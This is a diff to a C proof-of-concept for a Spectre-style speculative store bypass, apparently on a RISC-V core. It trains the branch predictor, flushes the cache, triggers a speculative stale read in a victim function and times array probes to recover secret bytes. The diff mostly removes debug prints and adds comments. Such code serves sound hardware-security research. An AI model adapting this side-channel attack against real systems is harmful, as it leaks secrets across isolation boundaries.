@@ -4,8 +4,8 @@
 #include "cache.h"
 
 #define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
-#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
-#define ATTACK_SAME_ROUNDS 1 // amount of times to attack the same index
+#define ROUNDS 1 
+#define ATTACK_SAME_ROUNDS 1 
 #define SECRET_SZ 1
 #define CACHE_HIT_THRESHOLD 50
 
@@ -56,11 +56,10 @@ void victim_function1(size_t malicious_x)
 	for(int i=0;i<100;i++)
 	{
 	     int junk=secretString[0];
-	     //asm("");
 	}
 	str[3]=malicious_x;
-	str[(int)((d*c+b*a)/(a*b*c+a)-16)]=0;
-	temp &= array2[array1[str[3]] * L1_BLOCK_SZ_BYTES];
+	str[(int)((d*c+b*a)/(a*b*c+a)-16)]=0; //Speculative store instruction, using stale data from str[3]
+	temp &= array2[array1[str[3]] * L1_BLOCK_SZ_BYTES];  //cache side channel
 }
 #pragma GCC pop_options
 
@@ -77,7 +76,6 @@ int main(void){
     volatile uint8_t dummy = 0;
     volatile static uint64_t results[256];
 
-    
     // try to read out the secret
     for(volatile uint64_t len = 0; len < SECRET_SZ; ++len){
 
@@ -95,34 +93,28 @@ int main(void){
             flushCache((uint64_t)b, sizeof(b));
             flushCache((uint64_t)c, sizeof(c));
             flushCache((uint64_t)d, sizeof(d));
-            //printf("%d\n",atkRound);
             
             victim_function1(attackIdx);
-
 
             // read out array 2 and see the hit secret value
             // this is also assuming there is no prefetching
             for (volatile int64_t i = 0; i < 256; ++i){
-		
                 start = rdcycle();
                 dummy += array2[i * L1_BLOCK_SZ_BYTES];
                 diff = (rdcycle() - start);
                 printf("%d ",diff);
 		if ( diff < CACHE_HIT_THRESHOLD ){
                     results[i] += 1;
-                    //printf("result:%d:%d\n",i,results[i]);
                 }
             }
             printf("\n");
            
         }
-        
-        printf("result:%d\n",results[104]);
+
         // get highest and second highest result hit values
         volatile uint8_t output[2];
         volatile uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
-
         printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
 
         // read in the next secret 
